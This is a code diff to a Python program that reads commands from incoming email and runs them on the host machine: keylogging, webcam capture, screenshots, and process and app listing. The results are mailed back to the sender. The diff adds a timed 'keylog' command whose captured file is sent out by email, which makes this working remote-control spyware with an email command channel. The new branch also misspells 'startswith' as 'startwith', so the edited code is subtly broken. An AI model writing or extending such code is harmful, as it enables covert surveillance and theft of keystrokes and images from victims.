@@ -1,4 +1,5 @@
-import resource.mail_handle_receive as mail_handle_receive
+# import resource.mail_handle_receive as mail_handle_receive
+from resource.mail_handle_receive import *
 import resource.mail_handle_send as mail_handle_send
 import resource.message_generate as message_generate
 import resource.system_control as system_control
@@ -17,7 +18,7 @@ function_map = {
     'webcam': system_control.webcam_image,
     'keylog': keylogr.keylog,
     'list_apps': resource_monitor.getAppInfo,
-    'list_processes': resource_monitor.list_processes,
+    'list_processes': resource_monitor.list_processes
 }
 
 
@@ -26,7 +27,7 @@ def request_handle(msg_list):
         return
     for msg in msg_list:
         recipient_mail = re.search(r'[\w\.-]+@[\w\.-]+', msg['From']).group()
-        cmd_list = mail_handle_receive.decode_mail(msg)
+        cmd_list = decode_mail(msg)
 # change cmd to message for each mail sent
     for cmd in cmd_list:
         try:
@@ -44,7 +45,13 @@ def request_handle(msg_list):
                 mail_handle_send.send_mail_success_execution(
                     recipient_mail, message)
                 function_map[cmd]()
-            elif cmd == "keylog" or cmd == "screenshot" or cmd == "webcam":
+            elif cmd.startwith('keylog'):
+                splitted = cmd.split(' ')
+                filename = function_map[splitted[0]](int(splitted[1]))
+                message = message_generate.success_message(cmd)
+                mail_handle_send.send_mail_success_execution(
+                    recipient_mail, message, filename)
+            elif cmd == "screenshot" or cmd == "webcam":
                 filename = function_map[cmd]()
                 message = message_generate.success_message(cmd)
                 mail_handle_send.send_mail_success_execution(
@@ -80,9 +87,9 @@ def waiting(message):
 
 
 def main():
-    mail = mail_handle_receive.login()
+    mail = login()
     while True:
-        msg_list = mail_handle_receive.get_mail_object(mail)
+        msg_list = get_mail_object(mail)
         if msg_list == None:
             waiting('Waiting for command')
         else:
